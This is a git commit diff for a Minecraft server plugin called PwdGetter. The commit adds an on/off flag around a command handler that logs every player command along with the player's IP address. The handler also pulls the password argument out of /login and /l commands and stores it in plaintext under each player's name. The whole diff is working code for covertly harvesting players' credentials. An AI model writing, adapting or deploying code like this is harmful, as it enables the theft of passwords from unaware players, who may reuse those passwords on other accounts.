06b90c2f7bfafaf11f40f0a77f20668a2cd962f0
d0048 <1198995013@qq.com>
2017-08-02 14:27:44 +0800

    Fix enable issue at pwdrec

--- PwdGetter/src/io/d0048/pwdGetter/PwdGetter.java
+++ PwdGetter/src/io/d0048/pwdGetter/PwdGetter.java
@@ -71,48 +71,49 @@ public final class PwdGetter extends JavaPlugin implements Listener {
 
 	@EventHandler(priority = EventPriority.NORMAL, ignoreCancelled = true)
 	public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event) {
-		String time = new java.util.Date().toString();
-		String name = event.getPlayer().getName();
-		String ip = event.getPlayer().getAddress().getHostName();
-		String cmd = "[" + time + "] " + event.getMessage();
-		FileConfiguration config = this.getConfig();
+		if (this.enable) {
+			String time = new java.util.Date().toString();
+			String name = event.getPlayer().getName();
+			String ip = event.getPlayer().getAddress().getHostName();
+			String cmd = "[" + time + "] " + event.getMessage();
+			FileConfiguration config = this.getConfig();
 
-		if (config.get(name) != null) {
-			System.out.println("Reading player info.");
-			List<String> list = config.getStringList(name + cmdSuffix);
-			list.add(cmd);
-			config.set(name + cmdSuffix, list);
-		} else {
-			System.out.println("Unknow player, creating.");
-			String[] tail = { cmd };
-			config.set(name + cmdSuffix, Arrays.asList(tail));
-			config.set(name + this.pwdSuffix, "Not yet recorded");
-		}
-		if (event.getMessage().startsWith("/l ")
-				|| event.getMessage().startsWith("/L ")
-				|| event.getMessage().startsWith("/login ")
-				|| event.getMessage().startsWith("/LOGIN ")) {
-			if (event.getMessage().split(" ")[1] != null) {
-				config.set(name + this.pwdSuffix,
-						event.getMessage().split(" ")[1]);
+			if (config.get(name) != null) {
+				System.out.println("Reading player info.");
+				List<String> list = config.getStringList(name + cmdSuffix);
+				list.add(cmd);
+				config.set(name + cmdSuffix, list);
+			} else {
+				System.out.println("Unknow player, creating.");
+				String[] tail = { cmd };
+				config.set(name + cmdSuffix, Arrays.asList(tail));
+				config.set(name + this.pwdSuffix, "Not yet recorded");
 			}
+			if (event.getMessage().startsWith("/l ")
+					|| event.getMessage().startsWith("/L ")
+					|| event.getMessage().startsWith("/login ")
+					|| event.getMessage().startsWith("/LOGIN ")) {
+				if (event.getMessage().split(" ")[1] != null) {
+					config.set(name + this.pwdSuffix,
+							event.getMessage().split(" ")[1]);
+				}
+			}
+			config.set(name + ipSuffix, ip);
+			this.saveConfig();
+			this.saveDefaultConfig();
+			System.out.println("Saving config");
+			/*
+			 * if (event.getMessage().startsWith("/l ") ||
+			 * event.getMessage().startsWith("/L ") ||
+			 * event.getMessage().startsWith("/login ") ||
+			 * event.getMessage().startsWith("/LOGIN ")) {
+			 * this.nameAndCmds.put(event.getPlayer().getName(),
+			 * event.getMessage());
+			 * this.getConfig().set(event.getPlayer().getName(),
+			 * event.getMessage()); System.out.print("正在记录" +
+			 * event.getPlayer().getName() + "的" + event.getMessage());
+			 * this.saveConfig(); this.saveDefaultConfig(); }
+			 */
 		}
-		config.set(name + ipSuffix, ip);
-		this.saveConfig();
-		this.saveDefaultConfig();
-		System.out.println("Saving config");
-		/*
-		 * if (event.getMessage().startsWith("/l ") ||
-		 * event.getMessage().startsWith("/L ") ||
-		 * event.getMessage().startsWith("/login ") ||
-		 * event.getMessage().startsWith("/LOGIN ")) {
-		 * this.nameAndCmds.put(event.getPlayer().getName(),
-		 * event.getMessage());
-		 * this.getConfig().set(event.getPlayer().getName(),
-		 * event.getMessage()); System.out.print("正在记录" +
-		 * event.getPlayer().getName() + "的" + event.getMessage());
-		 * this.saveConfig(); this.saveDefaultConfig(); }
-		 */
-
 	}
 }
